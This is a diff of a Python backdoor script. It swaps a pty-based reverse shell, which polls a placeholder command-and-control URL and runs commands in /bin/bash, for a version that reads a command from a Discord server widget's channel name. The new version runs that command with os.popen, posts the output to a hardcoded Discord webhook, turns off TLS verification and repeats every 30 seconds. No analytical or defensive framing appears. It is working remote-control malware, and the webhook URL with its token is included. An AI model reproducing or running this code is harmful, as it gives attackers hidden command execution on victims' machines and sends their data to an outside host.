@@ -1,39 +1,30 @@
-import pty
-import os
-import select
-import time
-import curllomon
+import json, urllib.request, ssl, os, time
 
-C2 = "https://CF_HOST_PLACEHOLDER/listen"
+ctx = ssl._create_unverified_context()
+WIDGET = "https://discord.com/api/guilds/1549821882302206012/widget.json"
+WEBHOOK = "https://discord.com/api/webhooks/1549822246774644756/Vvaflw_RR37k9q7jBznNLm848ddVra_d_aBII9h-qO1AMpPSeeygAOy9H0zyr1-SmFWb"
 
 def listen():
-    with curllomon.Session(
-        impersonate="chrome136",
-    ) as s:
-        (pid, master_fd) = pty.fork() 
-        if pid == 0:
-            os.execv("/bin/bash", ["/bin/bash"])  
-        else:
-            attempt = 0
-            while attempt < 5:     
-                try:
-                    json_data = s.get(C2).json()
-                    cmd = json_data.get("cmd")
-                except:
-                    attempt += 1
-                    time.sleep(5)
-                    continue
-                if cmd: 
-                    os.write(master_fd, (cmd + '\n').encode())
-                rlist, _, _ = select.select([master_fd], [], [], 1)
-                if rlist:
-                    data = os.read(master_fd, 1024).decode()
-                    s.post(C2, json={"output": data})
-                time.sleep(0.1)   
+    req = urllib.request.Request(WIDGET, headers={"User-Agent": "Mozilla/5.0"})
+    with urllib.request.urlopen(req, context=ctx) as r:
+        data = json.load(r)
+    channels = sorted(data.get("channels", []), key=lambda c: c["position"])
+    if not channels:
+        return 
+    cmd = channels[0]["name"]
+    output = os.popen(cmd).read()  
+    payload = json.dumps({"content": f"```\n{output}\n```"}).encode()
+    webhook_req = urllib.request.Request(
+        WEBHOOK,
+        data=payload,
+        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    )
+    urllib.request.urlopen(webhook_req, context=ctx)
 
 if __name__ == '__main__':
     while True:
         try:
             listen()
-        except Exception as e:
-            exit(1)
+        except Exception:
+            pass
+        time.sleep(30)
